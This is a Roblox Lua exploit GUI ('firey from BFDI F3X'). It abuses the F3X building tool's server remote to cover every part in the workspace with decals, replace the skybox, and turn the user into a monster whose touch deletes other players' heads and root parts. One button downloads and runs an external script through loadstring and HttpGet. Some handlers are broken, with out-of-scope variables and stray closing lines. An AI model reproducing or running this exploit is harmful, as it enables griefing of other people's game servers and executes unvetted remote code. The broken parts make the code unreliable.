-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local skybox = Instance.new("TextButton")
local DECALSPAM = Instance.new("TextButton")
local BECOMELEAFY = Instance.new("TextButton")
local BECOMEFIREY = Instance.new("TextButton")
local MESSAGE = Instance.new("TextButton")
local TEHPWN3X = Instance.new("TextButton")
local SPONGEBOBSKYBOX = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.690590084, 0, 0.362204731, 0)
Frame.Size = UDim2.new(0, 164, 0, 163)

TextLabel.Parent = ScreenGui
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.690590084, 0, 0.285433084, 0)
TextLabel.Size = UDim2.new(0, 164, 0, 50)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "firey from BFDI F3X"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000

skybox.Name = "skybox"
skybox.Parent = ScreenGui
skybox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
skybox.BorderColor3 = Color3.fromRGB(0, 0, 0)
skybox.BorderSizePixel = 0
skybox.Position = UDim2.new(0.711323738, 0, 0.383858263, 0)
skybox.Size = UDim2.new(0, 80, 0, 28)
skybox.Font = Enum.Font.SourceSans
skybox.Text = "FIREY SKYBOX"
skybox.TextColor3 = Color3.fromRGB(0, 0, 0)
skybox.TextSize = 14.000
skybox.MouseButton1Down:connect(function()
	--rgrg
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"8006679977")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(50,50,50))
				SetLocked(v,true)
			end
		end
	end
	Sky("16550809008")

	-----------------------------------

end)
DECALSPAM.Name = "DECAL SPAM"
DECALSPAM.Parent = ScreenGui
DECALSPAM.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DECALSPAM.BorderColor3 = Color3.fromRGB(0, 0, 0)
DECALSPAM.BorderSizePixel = 0
DECALSPAM.Position = UDim2.new(0.838915467, 0, 0.383858263, 0)
DECALSPAM.Size = UDim2.new(0, 63, 0, 29)
DECALSPAM.Font = Enum.Font.SourceSans
DECALSPAM.Text = "DECAL SPAM"
DECALSPAM.TextColor3 = Color3.fromRGB(0, 0, 0)
DECALSPAM.TextSize = 14.000
DECALSPAM.MouseButton1Down:connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("16550814713")

	-----------
end)
BECOMELEAFY.Name = "BECOME LEAFY"
BECOMELEAFY.Parent = ScreenGui
BECOMELEAFY.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BECOMELEAFY.BorderColor3 = Color3.fromRGB(0, 0, 0)
BECOMELEAFY.BorderSizePixel = 0
BECOMELEAFY.Position = UDim2.new(0.690590084, 0, 0.468503922, 0)
BECOMELEAFY.Size = UDim2.new(0, 87, 0, 31)
BECOMELEAFY.Font = Enum.Font.SourceSans
BECOMELEAFY.Text = "BECOME LEAFY"
BECOMELEAFY.TextColor3 = Color3.fromRGB(0, 0, 0)
BECOMELEAFY.TextSize = 14.000
BECOMELEAFY.MouseButton1Down:connect(function()
	script.Parent.Unanchor.MouseButton1Click:Connect(function()
		local function monsterSpawn(player)
			SetAnchor(true,char.HumanoidRootPart)
			CreatePart(char.HumanoidRootPart.CFrame,char)
			SetCollision(char.Part,false)
			SetLocked(char.Part,false)
			local monid = "263588013"
			SpawnDecal(char.Part,Enum.NormalId.Front)
			AddDecal(char.Part,monid,Enum.NormalId.Front)
			SpawnDecal(char.Part,Enum.NormalId.Back)
			AddDecal(char.Part,monid,Enum.NormalId.Back)
			SpawnDecal(char.Part,Enum.NormalId.Left)
			AddDecal(char.Part,monid,Enum.NormalId.Left)
			SpawnDecal(char.Part,Enum.NormalId.Right)
			AddDecal(char.Part,monid,Enum.NormalId.Right)
			Resize(char.Part, Vector3.new(6.2,6.2,6.2),char.Part.CFrame)
			--SetTrans(char.Part,0)
			for i, v in pairs(char:GetDescendants()) do
				if v:IsA("BasePart") or v:IsA("Part") then
					SetTrans(v,1)
				end
			end
			SetLocked(char.HumanoidRootPart,false)
			Weld(char.Part,char.HumanoidRootPart,char.Part)
			SetAnchor(false,char.Part)
			char.Part.CanCollide = false
			--AddMesh(char.Part)
			--MeshResize(char.Part,Vector3.new(3,3,3))
			--SetMesh(char.Part,"4340968808")
			--SetTexture(char.Part,"4340968918")
			SetAnchor(false,char.HumanoidRootPart)
			char.Humanoid.WalkSpeed = 35
			char.Part.Touched:connect(function(obj)
				if obj.Parent:FindFirstChild("Humanoid") then
					SetLocked(obj.Parent.Head,false)
					DestroyPart(obj.Parent.Head)
					SetLocked(obj.Parent.HumanoidRootPart,false)
					DestroyPart(obj.Parent.HumanoidRootPart)
					char.Humanoid.WalkSpeed = 100
				end
			end)
			char.Part.Name = "ThomasPart"
		end
		monsterSpawn(player)
	end)
end)
BECOMEFIREY.Name = "BECOME FIREY"
BECOMEFIREY.Parent = ScreenGui
BECOMEFIREY.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BECOMEFIREY.BorderColor3 = Color3.fromRGB(0, 0, 0)
BECOMEFIREY.BorderSizePixel = 0
BECOMEFIREY.Position = UDim2.new(0.838915467, 0, 0.478346467, 0)
BECOMEFIREY.Size = UDim2.new(0, 63, 0, 26)
BECOMEFIREY.Font = Enum.Font.SourceSans
BECOMEFIREY.Text = "BECOME FIREY"
BECOMEFIREY.TextColor3 = Color3.fromRGB(0, 0, 0)
BECOMEFIREY.TextSize = 14.000
BECOMEFIREY.MouseButton1Down:connect(function()
	local function monsterSpawn(player)
		SetAnchor(true,char.HumanoidRootPart)
		CreatePart(char.HumanoidRootPart.CFrame,char)
		SetCollision(char.Part,false)
		SetLocked(char.Part,false)
		local monid = "16550814713"
		SpawnDecal(char.Part,Enum.NormalId.Front)
		AddDecal(char.Part,monid,Enum.NormalId.Front)
		SpawnDecal(char.Part,Enum.NormalId.Back)
		AddDecal(char.Part,monid,Enum.NormalId.Back)
		SpawnDecal(char.Part,Enum.NormalId.Left)
		AddDecal(char.Part,monid,Enum.NormalId.Left)
		SpawnDecal(char.Part,Enum.NormalId.Right)
		AddDecal(char.Part,monid,Enum.NormalId.Right)
		Resize(char.Part, Vector3.new(6.2,6.2,6.2),char.Part.CFrame)
		--SetTrans(char.Part,0)
		for i, v in pairs(char:GetDescendants()) do
			if v:IsA("BasePart") or v:IsA("Part") then
				SetTrans(v,1)
			end
		end
		SetLocked(char.HumanoidRootPart,false)
		Weld(char.Part,char.HumanoidRootPart,char.Part)
		SetAnchor(false,char.Part)
		char.Part.CanCollide = false
		--AddMesh(char.Part)
		--MeshResize(char.Part,Vector3.new(3,3,3))
		--SetMesh(char.Part,"4340968808")
		--SetTexture(char.Part,"4340968918")
		SetAnchor(false,char.HumanoidRootPart)
		char.Humanoid.WalkSpeed = 35
		char.Part.Touched:connect(function(obj)
			if obj.Parent:FindFirstChild("Humanoid") then
				SetLocked(obj.Parent.Head,false)
				DestroyPart(obj.Parent.Head)
				SetLocked(obj.Parent.HumanoidRootPart,false)
				DestroyPart(obj.Parent.HumanoidRootPart)
				char.Humanoid.WalkSpeed = 100
			end
		end)
		char.Part.Name = "ThomasPart"
	end
	monsterSpawn(player)
end)
end)
end)
MESSAGE.Name = "MESSAGE"
MESSAGE.Parent = ScreenGui
MESSAGE.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MESSAGE.BorderColor3 = Color3.fromRGB(0, 0, 0)
MESSAGE.BorderSizePixel = 0
MESSAGE.Position = UDim2.new(0.70015949, 0, 0.549212575, 0)
MESSAGE.Size = UDim2.new(0, 87, 0, 27)
MESSAGE.Font = Enum.Font.SourceSans
MESSAGE.Text = "SERVER MESSAGE"
MESSAGE.TextColor3 = Color3.fromRGB(0, 0, 0)
MESSAGE.TextSize = 14.000

TEHPWN3X.Name = "TEHPWN3X"
TEHPWN3X.Parent = ScreenGui
TEHPWN3X.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TEHPWN3X.BorderColor3 = Color3.fromRGB(0, 0, 0)
TEHPWN3X.BorderSizePixel = 0
TEHPWN3X.Position = UDim2.new(0.838915467, 0, 0.549212575, 0)
TEHPWN3X.Size = UDim2.new(0, 71, 0, 27)
TEHPWN3X.Font = Enum.Font.SourceSans
TEHPWN3X.Text = "TEHPWN3X V2"
TEHPWN3X.TextColor3 = Color3.fromRGB(0, 0, 0)
TEHPWN3X.TextSize = 14.000
TEHPWN3X.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-tehpwn3x-v2-10704"))();
end)
SPONGEBOBSKYBOX.Name = "SPONGEBOB SKYBOX"
SPONGEBOBSKYBOX.Parent = ScreenGui
SPONGEBOBSKYBOX.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SPONGEBOBSKYBOX.BorderColor3 = Color3.fromRGB(0, 0, 0)
SPONGEBOBSKYBOX.BorderSizePixel = 0
SPONGEBOBSKYBOX.Position = UDim2.new(0.725677907, 0, 0.616141737, 0)
SPONGEBOBSKYBOX.Size = UDim2.new(0, 71, 0, 25)
SPONGEBOBSKYBOX.Font = Enum.Font.SourceSans
SPONGEBOBSKYBOX.Text = "SPONGEBOB SKYBOX"
SPONGEBOBSKYBOX.TextColor3 = Color3.fromRGB(0, 0, 0)
SPONGEBOBSKYBOX.TextSize = 14.000
SPONGEBOBSKYBOX.MouseButton1Down:connect(function()
	--rgrg
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"8006679977")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(50,50,50))
				SetLocked(v,true)
			end
		end
	end
	Sky("15911670359")

	-----------------------------------
end)